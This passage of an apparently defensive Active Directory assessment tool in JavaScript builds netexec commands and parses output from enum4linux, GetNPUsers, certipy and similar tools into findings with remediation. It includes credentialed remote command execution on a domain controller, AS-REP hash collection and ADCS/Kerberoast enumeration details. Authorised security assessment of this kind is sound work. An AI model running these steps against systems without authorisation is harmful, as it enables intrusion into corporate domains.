      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-nxc-maq", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["ldap", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "-M", "maq");
      return args;
    }, null, {
      desc: "MachineAccountQuota del dominio (netexec -M maq)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-nxc-spooler", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["smb", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "-M", "spooler");
      return args;
    }, null, {
      desc: "Print Spooler activo (netexec -M spooler) — solo detección",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-nxc-laps", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["ldap", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "-M", "laps");
      return args;
    }, null, {
      desc: "LAPS legible por la cuenta de assessment (netexec -M laps)",
      skipIf: skipCreds,
    }),
  );
  return steps;
}

/** CORP.LOCAL → DC=CORP,DC=LOCAL */
export function adDomainToDn(domain) {
  const d = String(domain || "").trim().replace(/^DC=/i, "");
  if (!d || !/[A-Za-z0-9]/.test(d)) return "";
  return d.split(".").filter(Boolean).map((p) => `DC=${p}`).join(",");
}

/** Fase 3: validez WinRM con creds — netexec winrm, sin evil-winrm / shell. */
export function adWinrmCheckSteps(step, host) {
  const h = String(host || "").trim();
  if (!h) return [];
  return [
    step("p3-ad-netexec-winrm", "netexec", (c) => {
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["winrm", h, "-u", user, "-p", pass];
      const d = String(c.adDomain || "").trim();
      if (d) args.push("-d", d);
      return args;
    }, null, {
      desc: "Comprobar autenticación WinRM (netexec; sin shell)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
  ];
}

/**
 * Cortafuegos AD (Windows Defender Firewall en el DC). A diferencia de
 * ufw/iptables/nft (host local, lectura directa) o de adWinrmCheckSteps
 * (solo valida auth, sin shell), Windows Firewall remoto NO tiene
 * consulta de solo-lectura vía RPC/LDAP — la única vía real es ejecutar
 * `netsh advfirewall show allprofiles` en el DC (netexec -x, por debajo
 * wmiexec: crea un proceso real, aunque el comando en sí sea de solo
 * lectura). Por eso vive en Fase 3 (Exploitation, mismo gate humano que
 * wmiexec.py/secretsdump.py), no junto a la collection AD de Fase 1/2.
 */
export function adFirewallCheckSteps(step, host) {
  const h = String(host || "").trim();
  if (!h) return [];
  return [
    step("p3-ad-firewall", "netexec", (c) => {
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["smb", h, "-u", user, "-p", pass, "-x", "netsh advfirewall show allprofiles"];
      const d = String(c.adDomain || "").trim();
      if (d) args.push("-d", d);
      return args;
    }, null, {
      desc: "Estado de Windows Firewall en el DC (netexec -x netsh advfirewall)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
  ];
}

const AD_FIREWALL_PROFILE_RE = /^(Domain|Private|Public) Profile Settings:\s*[\r\n]+-+\s*[\r\n]+State\s+(ON|OFF)/gim;
const AD_FIREWALL_PROFILE_SEVERITY = { domain: "High", private: "Medium", public: "Medium" };
const AD_FIREWALL_PROFILE_LABEL = { domain: "Domain", private: "Private", public: "Public" };

/** Parsea `netsh advfirewall show allprofiles` (vía netexec -x). */
export function adFirewallFindings(stdout, host) {
  const text = String(stdout || "");
  const out = [];
  for (const m of text.matchAll(AD_FIREWALL_PROFILE_RE)) {
    const key = m[1].toLowerCase();
    const state = m[2].toUpperCase();
    if (state !== "OFF") continue;
    const label = AD_FIREWALL_PROFILE_LABEL[key];
    out.push({
      title: `Windows Firewall desactivado (perfil ${label}) en ${host || "el DC"}`,
      severity: AD_FIREWALL_PROFILE_SEVERITY[key] || "Medium",
      description: `\`netsh advfirewall show allprofiles\` ejecutado remotamente confirma que el perfil ${label} de Windows Defender Firewall está en State OFF en ${host || "el controlador de dominio"}${key === "domain" ? " — este es el perfil que aplica al tráfico intra-dominio, el más sensible en un DC" : ""} (CWE-16).`,
      remediation: `Reactivar el perfil ${label}: \`netsh advfirewall set ${key}profile state on\`, o vía GPO (Computer Configuration > Windows Defender Firewall) para que no dependa de configuración manual por host.`,
    });
  }
  return out;
}

export function extractAdDomain(text) {
  const t = String(text || "");
  let m = t.match(/\(domain:([A-Za-z0-9._-]+)\)/i)
    || t.match(/Domain Name:\s*([A-Za-z0-9._-]+)/i)
    || t.match(/domain(?: name)?:\s*([A-Za-z0-9._-]+)/i)
    || t.match(/defaultNamingContext:\s*((?:DC=[^,=\s]+,?)+)/i);
  if (m) {
    let d = m[1];
    if (/^DC=/i.test(d)) {
      d = d.split(",").map((p) => p.replace(/^DC=/i, "")).filter(Boolean).join(".");
    }
    return d.replace(/^DC=/i, "");
  }
  m = t.match(/dnsHostName:\s*(\S+)/i);
  if (m && m[1].includes(".")) {
    const parts = m[1].split(".");
    if (parts.length >= 2) return parts.slice(1).join(".");
  }
  return "";
}

/** Usuarios RID/SAM de salidas enum4linux / rpcclient / lookupsid / samrdump. */
export function extractAdUsersFromBlob(text) {
  const users = [];
  const seen = new Set();
  const push = (u) => {
    const name = String(u || "").trim();
    if (!name || seen.has(name.toLowerCase())) return;
    if (/^\$|krbtgt$/i.test(name)) return;
    if (/^(SidType|Domain|Builtin|Account|User)$/i.test(name)) return;
    seen.add(name.toLowerCase());
    users.push(name);
  };
  for (const m of String(text || "").matchAll(/user:\[([^\]]+)\]/gi)) push(m[1]);
  // lookupsid: 500: CORP\Administrator (SidTypeUser)
  for (const m of String(text || "").matchAll(/\d+:\s*(?:[^\\\s]+\\)?([A-Za-z0-9._$-]+)\s*\(SidTypeUser\)/gi)) {
    push(m[1]);
  }
  // samrdump lines "User : name" / "Found user: name"
  for (const m of String(text || "").matchAll(/(?:^|\n)\s*User\s*[:=]\s*([A-Za-z0-9._$-]+)/gi)) {
    push(m[1]);
  }
  return users.slice(0, 40);
}

const HOSTS_TIP = "Cuando el engagement pase a Kerberos, añadir `IP FQDN dominio` en /etc/hosts del operador: Kerberos falla si no resuelve el nombre.";

/** Fingerprint netexec/nxc smb sin auth → dominio / signing / OS. */
export function netexecSmbFindings(stdout) {
  const text = String(stdout || "");
  const out = [];
  const domain = extractAdDomain(text);
  const hostM = text.match(/\(name:([A-Za-z0-9._-]+)\)/i);
  const osM = text.match(/\(\*\).*?\(([^)]*Windows[^)]*)\)/i)
    || text.match(/SMB\s+\S+\s+445\s+\S+\s+\[\*\]\s+(.+?)(?:\s+\(name:)/i);
  const signingFalse = /signing:\s*(?:False|No)\b/i.test(text);
  if (domain || hostM) {
    out.push({
      title: `AD: dominio ${domain || "desconocido"} detectado vía SMB${hostM ? ` (host ${hostM[1]})` : ""}`,
      severity: "Info",
      description: `netexec smb (sin credenciales) fingerprintó Active Directory/SMB${domain ? `: dominio «${domain}»` : ""}${hostM ? `, hostname «${hostM[1]}»` : ""}${osM ? `. Sistema: ${osM[1].trim()}` : ""}. Inventario de superficie interna; no es compromiso. ${HOSTS_TIP}`,
      remediation: `Confirmar alcance AD firmado. Restringir 445/389/88 al perímetro de administración. ${HOSTS_TIP}`,
    });
  }
  if (signingFalse) {
    out.push({
      title: "AD: SMB signing deshabilitado (relay factible)",
      severity: "High",
      description: "netexec reportó SMB signing False/No: un atacante con posición de red puede retransmitir autenticación NTLM (coercion + relay). Hallazgo de postura; no se ha ejecutado relay (mindmap OCD / Claude-AD).",
      remediation: "Habilitar SMB signing requerido por GPO (Microsoft network server: Digitally sign communications — Always). Re-verificar con netexec smb <host>.",
    });
  }
  return out.slice(0, 4);
}

/** netexec --shares (guest/null): permisos READ/WRITE por share. */
export function netexecSharesFindings(stdout) {
  const text = String(stdout || "");
  if (!/Enumerating shares|SHARE\s+Permissions|READ|WRITE/i.test(text)
    && !/\bADMIN\$\b|\bC\$\b|\bSYSVOL\b/i.test(text)) {
    return [];
  }
  const shares = [];
  const writeShares = [];
  for (const line of text.split("\n")) {
    const m = line.match(/\b([A-Za-z0-9$._-]{2,40})\s+(READ(?:\s*,\s*WRITE)?|WRITE(?:\s*,\s*READ)?|NO ACCESS)/i)
      || line.match(/\b([A-Za-z0-9$._-]{2,40})\s+.*\b(READ|WRITE)\b/i);
    if (!m) continue;
    const name = m[1];
    if (/^IPC\$?$/i.test(name) || /^(SHARE|Permissions|Remark)$/i.test(name)) continue;
    if (!shares.includes(name)) shares.push(name);
    if (/WRITE/i.test(m[2] || line)) writeShares.push(name);
  }
  if (!shares.length && !writeShares.length) return [];
  const out = [];
  if (writeShares.some((s) => /^C\$/i.test(s))) {
    out.push({
      title: "AD: escritura en C$ vía SMB (privilegio admin-equivalente)",
      severity: "Critical",
      description: "netexec --shares vio WRITE sobre C$: indicador fuerte de privilegios de administrador local / Backup Operators / equivalente. No se abrió shell WinRM ni se escribió nada.",
      remediation: "Rotar la cuenta usada (guest/null no debería tener WRITE en C$). Auditar membresía de Administrators / Backup Operators. Restringir C$ a admins.",
    });
  }
  out.push({
    title: `AD: ${shares.length || writeShares.length} share(s) vía guest/null (netexec)`,
    severity: writeShares.length ? "High" : "Medium",
    description: `netexec smb -u guest -p '' --shares listó: ${(shares.length ? shares : writeShares).slice(0, 10).join(", ")}${writeShares.length ? `. Con WRITE: ${writeShares.join(", ")}` : ""}. Fase 1 null session (mindmap OCD); no password spray.`,
    remediation: "Cerrar null/guest sessions; auditar ACLs de SYSVOL/NETLOGON/shares de datos.",
  });
  return out.slice(0, 4);
}

/** rpcclient enumdomusers (null). */
export function rpcclientUsersFindings(stdout) {
  const text = String(stdout || "");
  if (/NT_STATUS_ACCESS_DENIED|NT_STATUS_LOGON_FAILURE|Cannot connect/i.test(text)
    && !/user:\[/i.test(text)) {
    return [];
  }
  const users = [];
  const seen = new Set();
  for (const m of text.matchAll(/user:\[([^\]]+)\]/gi)) {
    const u = m[1].trim();
    if (!u || seen.has(u.toLowerCase())) continue;
    seen.add(u.toLowerCase());
    users.push(u);
    if (users.length >= 20) break;
  }
  if (!users.length) return [];
  return [{
    title: `AD: ${users.length} usuario(s) vía RPC null (rpcclient)`,
    severity: "Medium",
    description: `rpcclient -U "" -N -c enumdomusers volcó cuentas: ${users.slice(0, 10).join(", ")}${users.length > 10 ? "…" : ""}. Inventario RID sin password (CWE-200). La lista alimenta GetNPUsers -no-pass en Fase 2; no hay password spray automático.`,
    remediation: "Deshabilitar null session / SAMR anónimo hacia redes no confiables. Auditar cuentas con UF_DONT_REQUIRE_PREAUTH tras el paso AS-REP.",
  }];
}

/** enum4linux -a: usuarios, shares, dominio, política. */
export function enum4linuxFindings(stdout) {
  const text = String(stdout || "");
  if (!/enum4linux|Getting domain|Session (?:is as|opened)|Sharename|user:\[/i.test(text)
    && !/\[\*\]\s*Getting/i.test(text)) {
    // Algunas builds no imprimen "enum4linux" en stdout; aceptar bloques típicos.
    if (!/Domain Name:|password policy|user:\[|Sharename/i.test(text)) return [];
  }
  const out = [];
  const seen = new Set();
  const add = (f) => {
    const k = String(f.title || "").toLowerCase();
    if (!k || seen.has(k)) return;
    seen.add(k);
    out.push(f);
  };

  const domain = extractAdDomain(text);
  if (domain) {
    add({
      title: `AD: dominio ${domain} (enum4linux)`,
      severity: "Info",
      description: `enum4linux identificó el dominio/workgroup «${domain}» por enumeración anónima SMB/NetBIOS. Contexto de Active Directory; no implica acceso privilegiado.`,
      remediation: "Inventario: confirmar alcance. Si la sesión nula no debería existir, endurecer RestrictNullSessAccess / shares.",
    });
  }

  const users = [];
  const seenU = new Set();
  for (const m of text.matchAll(/user:\[([^\]]+)\]/gi)) {
    const u = m[1].trim();
    if (!u || seenU.has(u.toLowerCase())) continue;
    seenU.add(u.toLowerCase());
    users.push(u);
    if (users.length >= 12) break;
  }
  if (users.length) {
    add({
      title: `AD: ${users.length} usuario(s) enumerado(s) sin autenticación`,
      severity: "Medium",
      description: `enum4linux listó cuentas vía sesión nula/RID cycling: ${users.slice(0, 8).join(", ")}${users.length > 8 ? "…" : ""}. Inventario de identidades (CWE-200); no se probaron contraseñas.`,
      remediation: "Deshabilitar null sessions y RID cycling anónimo (LocalAccountTokenFilterPolicy / RestrictAnonymous). No exponer SAMR a redes no confiables.",
    });
  }

  const shares = [];
  for (const m of text.matchAll(/^\s*([A-Za-z0-9$._-]{2,40})\s+(?:Disk|IPC|Printer)/gim)) {
    const s = m[1];
    if (/^IPC\$?$/i.test(s)) continue;
    if (!shares.includes(s)) shares.push(s);
    if (shares.length >= 8) break;
  }
  if (shares.length) {
    add({
      title: `AD: ${shares.length} share(s) SMB visibles (enum4linux)`,
      severity: "Info",
      description: `Shares anunciados: ${shares.join(", ")}. Revisar si alguno es accesible sin auth en el paso smbclient.`,
      remediation: "Auditar ACLs de cada share; retirar shares administrativos innecesarios del perímetro.",
    });
  }

  const minLen = text.match(/Minimum password length:\s*(\d+)/i);
  if (minLen && Number(minLen[1]) < 8) {
    add({
      title: `AD: longitud mínima de contraseña ${minLen[1]} (débil)`,
      severity: "Medium",
      description: `enum4linux leyó la política de dominio: Minimum password length = ${minLen[1]} (< 8). Facilita fuerza bruta y password spray (CWE-521).`,
      remediation: "Subir la política de dominio a ≥ 14 caracteres (o passphrase) y habilitar complejidad / fine-grained PSO donde aplique.",
    });
  }

  return out.slice(0, 8);
}

/** smbclient -L -N: shares listables con sesión nula. */
export function smbclientNullFindings(stdout) {
  const text = String(stdout || "");
  if (/NT_STATUS_ACCESS_DENIED|NT_STATUS_LOGON_FAILURE|session setup failed/i.test(text)
    && !/Disk|IPC|Sharename/i.test(text)) {
    return [];
  }
  const shares = [];
  for (const m of text.matchAll(/(?:^|\n)([A-Za-z0-9$._-]{2,40})\|(?:Disk|IPC|Printer)/g)) {
    const s = m[1];
    if (/^IPC\$?$/i.test(s)) continue;
    if (!shares.includes(s)) shares.push(s);
  }
  // Formato clásico tabular
  for (const m of text.matchAll(/^\s*([A-Za-z0-9$._-]{2,40})\s+Disk/gim)) {
    if (!shares.includes(m[1])) shares.push(m[1]);
  }
  if (!shares.length) return [];
  const sensitive = shares.filter((s) => /^(ADMIN\$|C\$|IPC\$|SYSVOL|NETLOGON)$/i.test(s) || /backup|secret|finance|hr/i.test(s));
  return [{
    title: `AD: sesión nula SMB lista ${shares.length} share(s)`,
    severity: sensitive.length ? "High" : "Medium",
    description: `smbclient -L //-N listó shares sin credenciales: ${shares.slice(0, 10).join(", ")}${shares.length > 10 ? "…" : ""}.${sensitive.length ? ` Incluye superficie sensible: ${sensitive.join(", ")}.` : ""} Sesión nula = inventario gratis para un atacante (CWE-200).`,
    remediation: "Restringir null session (RestrictNullSessAccess=1, shares en NullSessionShares vacía). Exigir autenticación para listar shares.",
  }];
}

/** ldapsearch rootDSE anónimo. */
export function ldapAnonymousFindings(stdout) {
  const text = String(stdout || "");
  if (/Can'?t contact|Invalid credentials|Strong\(er\) authentication|operations error/i.test(text)
    && !/namingContexts|defaultNamingContext|dnsHostName/i.test(text)) {
    return [];
  }
  const contexts = [];
  for (const m of text.matchAll(/namingContexts:\s*(\S+)/gi)) {
    if (!contexts.includes(m[1])) contexts.push(m[1]);
  }
  const def = (text.match(/defaultNamingContext:\s*(\S+)/i) || [])[1];
  const host = (text.match(/dnsHostName:\s*(\S+)/i) || [])[1];
  if (!contexts.length && !def && !host) return [];
  return [{
    title: "AD: bind LDAP anónimo a rootDSE",
    severity: "Medium",
    description: `ldapsearch -x obtuvo rootDSE sin credenciales${def ? `: defaultNamingContext «${def}»` : ""}${host ? `, dnsHostName «${host}»` : ""}${contexts.length ? `. namingContexts: ${contexts.slice(0, 4).join("; ")}` : ""}. Discovery de directorio sin auth (CWE-200); no se enumeró el árbol completo.`,
    remediation: "Deshabilitar binds anónimos LDAP (dsHeuristics / LDAP server policies) o restringir rootDSE a redes de administración. Preferir LDAPS con autenticación.",
  }];
}

/** GetNPUsers.py -no-pass: cuentas AS-REP roastables (UF_DONT_REQUIRE_PREAUTH). */
export function getNpUsersFindings(stdout) {
  const text = String(stdout || "");
  if (/KDC_ERR_C_PRINCIPAL_UNKNOWN|Cannot contact|Kerberos SessionError/i.test(text)
    && !/\$krb5asrep\$/i.test(text)) {
    return [];
  }
  const roastable = [];
  const seen = new Set();
  for (const m of text.matchAll(/\$krb5asrep\$\d+\$([^@:\s]+)@([^\s:]+)/gi)) {
    const u = `${m[1]}@${m[2]}`;
    if (seen.has(u.toLowerCase())) continue;
    seen.add(u.toLowerCase());
    roastable.push(u);
  }
  if (!roastable.length) return [];
  return [{
    title: `AD: ${roastable.length} cuenta(s) AS-REP roastable(s)`,
    severity: "High",
    description: `GetNPUsers.py -no-pass obtuvo AS-REP sin preauth para: ${roastable.slice(0, 8).join(", ")}${roastable.length > 8 ? "…" : ""}. UF_DONT_REQUIRE_PREAUTH (CWE-308). No se ha crackeado el hash (sin hashcat/john automático).`,
    remediation: "Quitar DONT_REQ_PREAUTH de esas cuentas (PowerShell: Set-ADAccountControl -DoesNotRequirePreAuth $false). Preferir autenticación con preauth obligatorio en el dominio.",
  }];
}

/** GetUserSPNs.py sin -request: inventario de SPNs (Kerberoastables). */
export function getUserSpnsFindings(stdout) {
  const text = String(stdout || "");
  if (/KDC_ERR|Logon failure|STATUS_LOGON_FAILURE|Cannot authenticate/i.test(text)
    && !/ServicePrincipalName|SPN/i.test(text)) {
    return [];
  }
  const spns = [];
  const seen = new Set();
  for (const line of text.split("\n")) {
    const m = line.match(/\b((?:HTTP|MSSQL|CIFS|HOST|LDAP|SMTP|DNS|TERMSRV|WSMan)\/[^\s]+)\b/i)
      || line.match(/\b([A-Za-z0-9_-]+\/[A-Za-z0-9._-]+\.[A-Za-z0-9._-]+)\b/);
    if (!m) continue;
    const spn = m[1];
    if (seen.has(spn.toLowerCase())) continue;
    seen.add(spn.toLowerCase());
    spns.push(spn);
    if (spns.length >= 20) break;
  }
  if (!spns.length && !/ServicePrincipalName/i.test(text)) return [];
  if (!spns.length) {
    return [{
      title: "AD: cuentas con SPN detectadas (GetUserSPNs)",
      severity: "Medium",
      description: "GetUserSPNs listó cuentas con ServicePrincipalName (superficie Kerberoast). No se solicitó TGS (-request omitido): inventario, no hash dump.",
      remediation: "Revisar cuentas de servicio: contraseñas largas (≥25), gMSA donde sea posible, rotación. Minimizar SPNs innecesarios.",
    }];
  }
  return [{
    title: `AD: ${spns.length} SPN(s) Kerberoastable(s) enumerado(s)`,
    severity: "Medium",
    description: `GetUserSPNs (sin -request) listó SPNs: ${spns.slice(0, 10).join(", ")}${spns.length > 10 ? "…" : ""}. Superficie de Kerberoasting (T1558.003); no se ha pedido ticket ni crackeado.`,
    remediation: "gMSA / contraseñas de servicio largas; auditar SPNs huérfanos; no reutilizar passwords de cuentas de máquina en cuentas de usuario.",
  }];
}

/** certipy find -vulnerable -stdout. */
export function certipyFindFindings(stdout) {
  const text = String(stdout || "");
  if (/Invalid credentials|KDC_ERR|LDAP.*failed|unauthorized/i.test(text)
    && !/Vulnerable|ESC\d|Certificate Template/i.test(text)) {
    return [];
  }
  const templates = [];
  const seen = new Set();
  for (const m of text.matchAll(/(?:Template Name|Certificate Template)\s*[:=]\s*([A-Za-z0-9._-]+)/gi)) {
    const t = m[1];
    if (seen.has(t.toLowerCase())) continue;
    seen.add(t.toLowerCase());
    templates.push(t);
  }
  const esc = [...text.matchAll(/\bESC([1-9]|1[0-5])\b/gi)].map((m) => `ESC${m[1]}`);
  const escUnique = [...new Set(esc.map((e) => e.toUpperCase()))];
  if (!templates.length && !escUnique.length && !/Vulnerable Certificate Template/i.test(text)) {
    return [];
  }
  const sev = escUnique.some((e) => /^ESC(1|4|8|15)$/i.test(e)) ? "Critical" : "High";
  const esc15Note = escUnique.some((e) => /^ESC15$/i.test(e))
    ? " ESC15 (EKUwu, CVE-2024-49019) permite inyectar cualquier Application Policy (incluida Client Authentication) en un certificado emitido desde una plantilla con Schema Version 1, sin necesidad de enrollee-supplies-subject — vigente en CA con StrongCertificateBindingEnforcement no forzado (modo Compatibility)."
    : "";
  return [{
    title: `AD: ADCS template(s) vulnerable(s)${escUnique.length ? ` (${escUnique.slice(0, 4).join(", ")})` : ""}`,
    severity: sev,
    description: `certipy find -vulnerable -stdout detectó plantillas/ESC${templates.length ? `: ${templates.slice(0, 6).join(", ")}` : ""}${escUnique.length ? `. Clases: ${escUnique.join(", ")}` : ""}. Solo enumeración read-only; no se solicitó certificado abusivo.${esc15Note}`,
    remediation: "Auditar plantillas (enrollee supplies subject, overly permissive enrollment). Remediaciones ESC1–ESC8 según SpecterOps / Certified Pre-Owned; para ESC15 forzar StrongCertificateBindingEnforcement=2 en la CA y auditar plantillas Schema Version 1. Restringir Enrollment Agents y managers.",
  }];
}

/** netexec winrm: validez de creds, sin shell. */
export function netexecWinrmFindings(stdout) {
  const text = String(stdout || "");
  if (/\[-\].*(?:LOGIN|STATUS_LOGON|Authentication)/i.test(text)
    && !/\[\+\].*WINRM|Pwn3d/i.test(text)) {
    return [];
  }
  const pwn = /Pwn3d!/i.test(text);
  const ok = /WINRM\s+\S+.*\[\+\]/i.test(text) || pwn;
  if (!ok) return [];
  const userM = text.match(/\[\+\]\s*([^\s:]+)\\([^\s:]+):/i)
    || text.match(/\[\+\]\s*([^\\\s]+)\\([^:\s]+)/i);
  const who = userM ? `${userM[1]}\\${userM[2]}` : "cuenta suministrada";
  return [{
    title: pwn
      ? `AD: WinRM autenticado con privilegio admin (${who})`
      : `AD: autenticación WinRM válida (${who})`,
    severity: pwn ? "Critical" : "High",
    description: `netexec winrm confirmó credenciales válidas para ${who}${pwn ? " con indicador Pwn3d! (admin/local admin equivalente)" : ""}. Solo check de auth; no se abrió evil-winrm ni se ejecutó comando remoto.`,
    remediation: "Rotar la cuenta si no debía tener WinRM; restringir 5985/5986 al admin net; Privileged Access Workstations; MFA donde aplique.",
  }];
}

/** lookupsid.py: RID cycling → cuentas SidTypeUser. */
export function lookupsidFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_ACCESS_DENIED|STATUS_LOGON_FAILURE|Connection error|SMB SessionError/i.test(text)
    && !/SidTypeUser/i.test(text)) {
    return [];
  }
  const users = [];
  const seen = new Set();
  for (const m of text.matchAll(/(\d+):\s*(?:([^\\\s]+)\\)?([A-Za-z0-9._$-]+)\s*\(SidTypeUser\)/gi)) {
    const rid = m[1];
    const u = m[3];
    const key = u.toLowerCase();
    if (seen.has(key)) continue;
    seen.add(key);
    users.push(rid === "500" || /^Administrator$/i.test(u) ? `${u} (RID ${rid})` : u);
    if (users.length >= 25) break;
  }
  if (!users.length) return [];
  return [{
    title: `AD: ${users.length} cuenta(s) vía RID cycling (lookupsid)`,
    severity: "Medium",
    description: `lookupsid enumeró SidTypeUser: ${users.slice(0, 12).join(", ")}${users.length > 12 ? "…" : ""}. Inventario RID (T1087.002); no password spray.`,
    remediation: "Restringir SAMR/LSA a redes de administración. Deshabilitar null sessions si el dump fue anónimo.",
  }];
}

/** samrdump.py: listado de usuarios vía SAMR. */
export function samrdumpFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_ACCESS_DENIED|STATUS_LOGON_FAILURE|Connection error|SMB SessionError/i.test(text)
    && !/User\s*[:=]|Found domain/i.test(text)) {
    return [];
  }
  const users = [];
  const seen = new Set();
  for (const m of text.matchAll(/(?:^|\n)\s*User\s*[:=]\s*([A-Za-z0-9._$-]+)/gi)) {
    const u = m[1];
    if (seen.has(u.toLowerCase())) continue;
    seen.add(u.toLowerCase());
    users.push(u);
    if (users.length >= 25) break;
  }
  const domain = (text.match(/Found domain\s*[:=]\s*([A-Za-z0-9._-]+)/i)
    || text.match(/Domain\s*[:=]\s*\[?([A-Za-z0-9._-]+)/i) || [])[1];
  if (!users.length && !domain) return [];
  const out = [];
  if (domain) {
    out.push({
      title: `AD: dominio ${domain} (samrdump)`,
      severity: "Info",
      description: `samrdump identificó el dominio «${domain}» vía SAMR.`,
      remediation: `Confirmar alcance. ${HOSTS_TIP}`,
    });
  }
  if (users.length) {
    out.push({
      title: `AD: ${users.length} usuario(s) vía SAMR (samrdump)`,
      severity: "Medium",
      description: `samrdump listó: ${users.slice(0, 12).join(", ")}${users.length > 12 ? "…" : ""}. Inventario de identidades; no se probaron contraseñas.`,
      remediation: "Limitar SAMR anónimo/guest; auditar exposición 445 hacia redes no confiables.",
    });
  }
  return out.slice(0, 4);
}

/** netexec smb --users (autenticado). */
export function netexecUsersFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_LOGON_FAILURE|LOGIN FAILED|\[\-\].*SMB/i.test(text)
    && !/--users|Username|rid:/i.test(text)) {
    return [];
  }
  const users = [];
  const seen = new Set();
  for (const m of text.matchAll(/\b([A-Za-z0-9._$-]{2,64})\s+rid:\s*(\d+)/gi)) {
    const u = m[1];
    if (seen.has(u.toLowerCase())) continue;
    if (/^(SMB|[*]|Username|Domain)$/i.test(u)) continue;
    seen.add(u.toLowerCase());
    users.push(u);
    if (users.length >= 30) break;
  }
  if (!users.length) {
    for (const m of text.matchAll(/SMB\s+\S+\s+\d+\s+\S+\s+([A-Za-z0-9._$-]+)\s+/g)) {
      const u = m[1];
      if (/^(STATUS|Error|[*])/i.test(u)) continue;
      if (seen.has(u.toLowerCase())) continue;
      seen.add(u.toLowerCase());
      users.push(u);
      if (users.length >= 30) break;
    }
  }
  if (!users.length && !/Enumerat(?:e|ing) domain users|--users/i.test(text)) return [];
  if (!users.length) {
    return [{
      title: "AD: enumeración de usuarios de dominio (netexec --users)",
      severity: "Info",
      description: "netexec smb --users devolvió salida de enumeración autenticada sin lista parseable línea a línea. Revisar evidencia cruda del paso.",
      remediation: "Confirmar privilegios de la cuenta usada; restringir SAMR/LDAP a admin nets.",
    }];
  }
  return [{
    title: `AD: ${users.length} usuario(s) de dominio (netexec --users)`,
    severity: "Info",
    description: `netexec smb --users (autenticado) listó: ${users.slice(0, 12).join(", ")}${users.length > 12 ? "…" : ""}. Inventario con creds válidas; no password spray.`,
    remediation: "Auditar cuentas privilegiadas y de servicio. Limitar quién puede enumerar el directorio.",
  }];
}

/** netexec smb --groups. */
export function netexecGroupsFindings(stdout) {
  const text = String(stdout || "");
  if (/STATUS_LOGON_FAILURE|LOGIN FAILED/i.test(text) && !/membercount|Group:|rid:/i.test(text)) {
    return [];
  }
  const groups = [];
  const seen = new Set();
  const privileged = [];
  for (const line of text.split("\n")) {
    const m = line.match(/([A-Za-z][A-Za-z0-9._\s-]{1,64}?)\s+membercount:\s*(\d+)/i)
      || line.match(/SMB\s+\S+\s+\d+\s+\S+\s+([A-Za-z][A-Za-z0-9._\s-]{1,64}?)\s+(\d+)\s*$/);
    if (!m) continue;
    const g = m[1].trim().replace(/\s+/g, " ");
    if (/^(SMB|Domain|Group)$/i.test(g)) continue;
    if (seen.has(g.toLowerCase())) continue;
    seen.add(g.toLowerCase());
    groups.push(g);
    if (/Domain Admins|Enterprise Admins|Schema Admins|Administrators|Account Operators|Backup Operators/i.test(g)) {
      privileged.push(g);
    }
    if (groups.length >= 25) break;
  }
  if (!groups.length && !/membercount|--groups/i.test(text)) return [];
  const sev = privileged.length ? "Medium" : "Info";
  return [{
    title: privileged.length
      ? `AD: grupos privilegiados visibles (${privileged.slice(0, 3).join(", ")})`
      : `AD: ${groups.length || "N"} grupo(s) de dominio (netexec --groups)`,
    severity: sev,
    description: `netexec smb --groups listó grupos${groups.length ? `: ${groups.slice(0, 10).join(", ")}${groups.length > 10 ? "…" : ""}` : ""}${privileged.length ? `. Privilegiados: ${privileged.join(", ")}` : ""}. Inventario; no se modificó membresía.`,
    remediation: "Revisar Nested groups y cuentas en Domain Admins. Principio de mínimo privilegio.",
  }];
}

/** netexec smb --pass-pol. */
export function netexecPassPolFindings(stdout) {
  const text = String(stdout || "");
  if (!/Minimum password length|Password Complexity|Account Lockout|pass-pol|PASSWORD/i.test(text)) {
    return [];
  }
  const minLen = (text.match(/Minimum password length:\s*(\d+)/i) || [])[1];
  const complexity = (text.match(/Password (?:Properties|Complexity)[^\n]*:\s*([^\n]+)/i) || [])[1];
  const lockout = (text.match(/Account Lockout Threshold:\s*(\d+|None)/i) || [])[1];
  const out = [];
  if (minLen != null && Number(minLen) < 12) {
    out.push({
      title: `AD: longitud mínima de contraseña ${minLen} (política de dominio)`,
      severity: Number(minLen) < 8 ? "High" : "Medium",
      description: `netexec --pass-pol: Minimum password length = ${minLen}${complexity ? `; complexity/properties: ${complexity.trim()}` : ""}${lockout != null ? `; lockout threshold: ${lockout}` : ""}. Facilita spray/brute (CWE-521).`,
      remediation: "Subir a ≥ 14 (o passphrase) + fine-grained PSO; lockout sensato sin DoS fácil.",
    });
  } else if (minLen != null || complexity || lockout != null) {
    out.push({
      title: "AD: política de contraseñas del dominio (netexec --pass-pol)",
      severity: "Info",
      description: `Política leída${minLen != null ? `: min length ${minLen}` : ""}${complexity ? `; ${complexity.trim()}` : ""}${lockout != null ? `; lockout ${lockout}` : ""}.`,
      remediation: "Mantener política alineada con ENS/NIS2; revisar PSO por OU crítica.",
    });
  }
  if (/Password Complexity:\s*(?:False|Disabled|None|0)\b/i.test(text)) {
    out.push({
